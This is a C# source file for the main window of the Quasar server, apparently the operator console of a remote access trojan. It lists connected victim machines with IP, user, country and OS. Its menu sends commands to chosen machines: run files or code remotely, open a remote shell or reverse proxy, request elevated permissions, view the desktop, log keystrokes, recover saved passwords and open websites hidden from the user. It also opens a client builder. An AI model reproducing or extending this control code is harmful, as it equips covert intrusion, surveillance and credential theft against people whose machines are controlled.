using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Server.Extensions;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmMain : Form
    {
        public QuasarServer ListenServer { get; set; }

        private const int STATUS_ID = 4;
        private const int USERSTATUS_ID = 5;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly ClientStatusHandler _clientStatusHandler;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object(); // lock for clients-listview

        public FrmMain()
        {
            _clientStatusHandler = new ClientStatusHandler();
            RegisterMessageHandler();
            InitializeComponent();
        }

        /// <summary>
        /// Registers the client status message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            MessageHandler.Register(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated += SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
        }

        /// <summary>
        /// Unregisters the client status message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated -= SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("Quasar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("Quasar - Connected: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            X509Certificate2 serverCertificate;
#if DEBUG
            serverCertificate = new DummyCertificate();
#else
            if (!File.Exists(Settings.CertificatePath))
            {
                using (var certificateSelection = new FrmCertificate())
                {
                    while (certificateSelection.ShowDialog() != DialogResult.OK)
                    { }
                }
            }
            serverCertificate = new X509Certificate2(Settings.CertificatePath);
#endif
            /*var str = Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert));

            var cert2 = new X509Certificate2(Convert.FromBase64String(str));
            var serverCsp = (RSACryptoServiceProvider)serverCertificate.PublicKey.Key;
            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(cert2).PublicKey.Key;

            var result = serverCsp.ExportParameters(false);
            var result2 = connectedCsp.ExportParameters(false);

            var b = SafeComparison.AreEqual(result.Exponent, result2.Exponent) &&
                    SafeComparison.AreEqual(result.Modulus, result2.Modulus);*/

            ListenServer = new QuasarServer(serverCertificate);
            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void StartConnectionListener()
        {
            try
            {
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support, Settings.UseUPnP);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(this, $"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}\n\n", "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                ListenServer.Disconnect();
            }
            catch (Exception)
            {
                ListenServer.Disconnect();
            }
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen)
            {
                StartConnectionListener();
            }

            if (Settings.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();
            AutostartListening();
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.Disconnect();
            UnregisterMessageHandler();
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        private void ServerState(Networking.Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    if (!listening)
                        lstClients.Items.Clear();
                    listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            if (Settings.ShowPopup)
                                ShowPopup(client.Key);
                            break;
                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        /// <summary>
        /// Sets the tooltip text of the listview item of a client.
        /// </summary>
        /// <param name="client">The client on which the change is performed.</param>
        /// <param name="text">The new tooltip text.</param>
        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Adds a connected client to the Listview.
        /// </summary>
        /// <param name="client">The client to add.</param>
        private void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                // this " " leaves some space between the flag-icon and first item
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address, client.Value.Tag,
                    client.Value.UserAtPc, client.Value.Version, "Connected", "Active", client.Value.CountryWithCode,
                    client.Value.OperatingSystem, client.Value.AccountType
                }) { Tag = client, ImageIndex = client.Value.ImageIndex };

                lstClients.Invoke((MethodInvoker) delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Add(lvi);
                    }
                });

                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Removes a connected client from the Listview.
        /// </summary>
        /// <param name="client">The client to remove.</param>
        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            lvi.Remove();
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the status of a client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client to update the status of.</param>
        /// <param name="text">The new status.</param>
        private void SetStatusByClient(object sender, Client client, string text)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[STATUS_ID].Text = text;
        }

        /// <summary>
        /// Sets the user status of a client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client to update the user status of.</param>
        /// <param name="userStatus">The new user status.</param>
        private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();

        }

        /// <summary>
        /// Gets the Listview item which belongs to the client. 
        /// </summary>
        /// <param name="client">The client to get the Listview item of.</param>
        /// <returns>Listview item of the client.</returns>
        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker) delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });

            return itemClient;
        }

        /// <summary>
        /// Gets all selected clients.
        /// </summary>
        /// <returns>An array of all selected Clients.</returns>
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }

        /// <summary>
        /// Gets all connected clients.
        /// </summary>
        /// <returns>An array of all connected Clients.</returns>
        private Client[] GetConnectedClients()
        {
            return ListenServer.ConnectedClients;
        }

        /// <summary>
        /// Displays a popup with information about a client.
        /// </summary>
        /// <param name="c">The client.</param>
        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;
                    
                    notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                        c.Value.OperatingSystem), ToolTipIcon.Info);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Client Management"

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoAskElevate());
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientReconnect());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientDisconnect());
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    c.Send(new DoClientUninstall());
                }
            }
        }

        #endregion

        #region "Administration"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
                frmStm.Show();
                frmStm.Focus();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
                frmTm.Show();
                frmTm.Focus();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
                frmCon.Show();
                frmCon.Focus();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmReverseProxy frmRs = new FrmReverseProxy(clients);
                frmRs.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
                    frmRe.Show();
                    frmRe.Focus();
                }
            }
        }

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients, 1);
                frmRe.Show();
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients, 0);
                frmRe.Show();
            }
        }

        private void CodeExecutorToolStripMenuItem_Click(object sender, EventArgs e) 
        {
            Client[] clients = GetSelectedClients();
            if (clients.Count() > 0) 
            {
                new FrmExecuteCode(clients).Show();
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Shutdown});
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Restart});
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Standby});
            }
        }

        #endregion

        #region "Monitoring"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
                frmPass.Show();
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        #endregion

        #region "User Support"

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoVisitWebsite
                            {
                                Url = frm.Url,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoShowMessageBox
                            {
                                Caption = frm.MsgBoxCaption,
                                Text = frm.MsgBoxText,
                                Button = frm.MsgBoxButton,
                                Icon = frm.MsgBoxIcon
                            });
                        }
                    }
                }
            }
        }

        #endregion

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
#endif
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }

        #endregion
    }
}